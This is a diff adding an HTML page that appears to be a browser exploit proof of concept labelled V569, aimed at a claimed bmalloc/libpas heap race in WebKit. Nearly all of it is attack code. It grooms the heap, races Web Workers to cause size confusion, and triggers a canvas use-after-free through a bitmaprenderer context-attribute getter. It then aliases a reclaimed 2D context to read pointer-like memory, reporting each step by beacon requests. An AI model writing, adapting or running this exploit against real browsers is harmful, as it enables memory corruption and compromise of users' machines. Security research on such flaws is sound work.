@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V569</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function beacon(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V569-'+tag+'?d='+encodeURIComponent(String(data).substring(0,400))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+
+window.onerror=function(m,s,l,c){
+  beacon('ONERROR',m+'|'+s+':'+l+':'+c);
+};
+
+beacon('BOOT','V569-bmalloc-race|CVE-2025-43531');
+
+// CVE-2025-43531: bmalloc/libpas medium directory tuple race
+// Lock-free medium_directory_tuple_for_index returns raw pointer
+// Concurrent scavenger can decommit/reuse between read and deref
+// Result: wrong size class -> heap corruption / size confusion
+//
+// Strategy:
+// Phase 1: Warm up medium-size allocations to populate medium directories
+// Phase 2: Create scavenger pressure via alloc/free cycling
+// Phase 3: Race workers doing medium allocs against scavenger
+// Phase 4: Detect size confusion via AB/canvas pixel overlap
+
+var MEDIUM_SIZE = 4096;  // medium range in libpas
+var NUM_WORKERS = 4;
+var RACE_ITERATIONS = 5000;
+var SENTINEL = 0xAA;
+var workersDone = 0;
+var workerResults = [];
+
+// Phase 1: Warm up medium directory
+(function warmup(){
+  var bufs = [];
+  for(var i=0;i<200;i++) bufs.push(new ArrayBuffer(MEDIUM_SIZE));
+  beacon('P1','warmup|bufs='+bufs.length);
+  bufs = null;
+})();
+
+// Phase 2: Scavenger pressure — alloc+free rapidly to trigger scavenging
+function scavengerPressure(){
+  var rounds = 20;
+  for(var r=0;r<rounds;r++){
+    var tmp = [];
+    for(var i=0;i<100;i++) tmp.push(new ArrayBuffer(MEDIUM_SIZE));
+    tmp = null;
+    // Light GC to encourage scavenger
+    for(var g=0;g<3;g++){
+      var j=[];for(var i=0;i<500;i++)j.push({x:i});j=null;
+    }
+  }
+}
+
+scavengerPressure();
+beacon('P2','scavenger-pressure-done');
+
+// Phase 3: Worker source — each worker does rapid medium allocations
+var workerSrc = [
+  'var MEDIUM_SIZE = ' + MEDIUM_SIZE + ';',
+  'var ITERS = ' + RACE_ITERATIONS + ';',
+  'var SENTINEL = ' + SENTINEL + ';',
+  'var hits = 0;',
+  'var sizeErrors = 0;',
+  'var overlapCount = 0;',
+  '',
+  'function raceCycle() {',
+  '  var bufs = [];',
+  '  var views = [];',
+  '  // Rapid alloc cycle: create, fill with sentinel, check, free',
+  '  for (var i = 0; i < 50; i++) {',
+  '    var ab = new ArrayBuffer(MEDIUM_SIZE);',
+  '    var u8 = new Uint8Array(ab);',
+  '    // Fill with sentinel pattern',
+  '    for (var j = 0; j < u8.length; j++) u8[j] = SENTINEL;',
+  '    bufs.push(ab);',
+  '    views.push(u8);',
+  '  }',
+  '  // Check for anomalies: non-zero bytes in freshly allocated buffers',
+  '  // (should be zero-init, but race could give us stale data)',
+  '  for (var i = 0; i < 50; i++) {',
+  '    var ab2 = new ArrayBuffer(MEDIUM_SIZE);',
+  '    var u8_2 = new Uint8Array(ab2);',
+  '    for (var j = 0; j < u8_2.length; j++) {',
+  '      if (u8_2[j] !== 0) {',
+  '        hits++;',
+  '        if (u8_2[j] === SENTINEL) overlapCount++;',
+  '        break;',
+  '      }',
+  '    }',
+  '  }',
+  '  bufs = null;',
+  '  views = null;',
+  '}',
+  '',
+  'for (var iter = 0; iter < ITERS; iter++) {',
+  '  raceCycle();',
+  '  // Every 500 iters, also do pressure',
+  '  if (iter % 500 === 0) {',
+  '    var pressure = [];',
+  '    for (var p = 0; p < 200; p++) pressure.push(new ArrayBuffer(MEDIUM_SIZE));',
+  '    pressure = null;',
+  '  }',
+  '}',
+  '',
+  'postMessage({hits: hits, overlap: overlapCount, iters: ITERS});'
+].join('\n');
+
+function startWorkers(){
+  beacon('P3','starting-workers|n='+NUM_WORKERS);
+
+  for(var w=0;w<NUM_WORKERS;w++){
+    try{
+      var blob = new Blob([workerSrc], {type:'application/javascript'});
+      var url = URL.createObjectURL(blob);
+      var worker = new Worker(url);
+
+      (function(wid){
+        worker.onmessage = function(e){
+          var d = e.data;
+          workerResults.push(d);
+          workersDone++;
+          beacon('W'+wid, 'hits='+d.hits+'|overlap='+d.overlap+'|iters='+d.iters);
+          if(workersDone >= NUM_WORKERS) onAllDone();
+        };
+        worker.onerror = function(e){
+          workersDone++;
+          beacon('W'+wid+'-ERR', e.message);
+          if(workersDone >= NUM_WORKERS) onAllDone();
+        };
+      })(w);
+
+      URL.revokeObjectURL(url);
+    }catch(e){
+      beacon('W'+w+'-FAIL', e.message);
+      workersDone++;
+    }
+  }
+
+  // Main thread also drives scavenger pressure during worker race
+  var mainHits = 0;
+  var mainOverlap = 0;
+  for(var i=0;i<2000;i++){
+    var bufs = [];
+    for(var j=0;j<30;j++) bufs.push(new ArrayBuffer(MEDIUM_SIZE));
+    // Check fresh allocs for stale data
+    for(var j=0;j<20;j++){
+      var ab = new ArrayBuffer(MEDIUM_SIZE);
+      var u8 = new Uint8Array(ab);
+      for(var k=0;k<u8.length;k++){
+        if(u8[k]!==0){
+          mainHits++;
+          if(u8[k]===SENTINEL) mainOverlap++;
+          break;
+        }
+      }
+    }
+    bufs = null;
+  }
+  beacon('P3-MAIN','hits='+mainHits+'|overlap='+mainOverlap);
+}
+
+function onAllDone(){
+  var totalHits = 0;
+  var totalOverlap = 0;
+  for(var i=0;i<workerResults.length;i++){
+    totalHits += workerResults[i].hits;
+    totalOverlap += workerResults[i].overlap;
+  }
+  beacon('P4','total-hits='+totalHits+'|total-overlap='+totalOverlap+'|workers='+workerResults.length);
+
+  // Phase 5: Now test with canvas UAF alias to see if confusion persists
+  phase5CanvasTest();
+}
+
+function phase5CanvasTest(){
+  // Establish canvas alias
+  function triggerUAF(){
+    var outer=document.createElement('canvas');
+    outer.width=1;outer.height=1;
+    var innerCtx=null;
+    var dict={};
+    Object.defineProperty(dict,'alpha',{
+      get:function(){
+        innerCtx=outer.getContext('2d');
+        return true;
+      }
+    });
+    outer.getContext('bitmaprenderer',dict);
+    return {ctx:innerCtx,canvas:outer};
+  }
+
+  try{
+    // Heap warmup for 768B size class
+    var warmup=[];
+    for(var i=0;i<100;i++){
+      var c=document.createElement('canvas');c.width=1;c.height=1;
+      warmup.push(c.getContext('2d'));
+    }
+    warmup=null;
+
+    var reclaim=[];
+    for(var i=0;i<50;i++){
+      var c=document.createElement('canvas');c.width=1;c.height=1;
+      reclaim.push(c.getContext('2d'));
+    }
+
+    var u = triggerUAF();
+
+    // Reclaim with contexts that have known lineWidth
+    var rCtxs=[];var rCvs=[];
+    for(var i=0;i<200;i++){
+      var c=document.createElement('canvas');c.width=1;c.height=1;
+      var ctx=c.getContext('2d');
+      ctx.lineWidth=200+i;
+      rCtxs.push(ctx);rCvs.push(c);
+    }
+
+    var lw = u.ctx.lineWidth;
+    var idx = Math.round(lw-200);
+    beacon('P5-ALIAS','idx='+idx+'|lw='+lw);
+
+    if(idx>=0 && idx<200 && lw>=200 && lw<400){
+      var aliasCtx = rCtxs[idx];
+
+      // Now race medium allocs WHILE reading alias
+      // If bmalloc confusion corrupted the 768B size class,
+      // the alias might read non-float data
+      var anomalies = 0;
+      var samples = [];
+      for(var round=0;round<100;round++){
+        // Drive more medium allocs to pressure bmalloc
+        var pressure = [];
+        for(var p=0;p<50;p++) pressure.push(new ArrayBuffer(MEDIUM_SIZE));
+        pressure = null;
+
+        // Read all float fields through alias
+        var fields = [
+          aliasCtx.lineWidth,
+          aliasCtx.miterLimit,
+          aliasCtx.globalAlpha,
+          aliasCtx.shadowBlur,
+          aliasCtx.shadowOffsetX,
+          aliasCtx.shadowOffsetY,
+          aliasCtx.lineDashOffset
+        ];
+
+        for(var f=0;f<fields.length;f++){
+          var v = fields[f];
+          // Check for NaN, Infinity, or suspiciously large values (pointer-like)
+          if(v!==v || !isFinite(v) || Math.abs(v)>1e15){
+            anomalies++;
+            if(samples.length<5){
+              var dv=new DataView(new ArrayBuffer(8));
+              dv.setFloat64(0,v);
+              var hex='';
+              for(var b=0;b<8;b++) hex+=('0'+dv.getUint8(b).toString(16)).slice(-2);
+              samples.push('r'+round+'f'+f+'='+hex);
+            }
+          }
+        }
+      }
+
+      beacon('P5-SCAN','anomalies='+anomalies+'|samples='+samples.join(','));
+
+      // Final alias health check
+      aliasCtx.lineWidth = 99.99;
+      var rb = aliasCtx.lineWidth;
+      beacon('P5-HEALTH','set=99.99|got='+rb+'|ok='+(rb===99.99));
+    }else{
+      beacon('P5-NOALIAS','idx='+idx+'|lw='+lw);
+    }
+  }catch(e){
+    beacon('P5-ERR',e.message);
+  }
+
+  beacon('DONE','V569-complete');
+}
+
+// Kick off
+startWorkers();
+</script>
+</body></html>
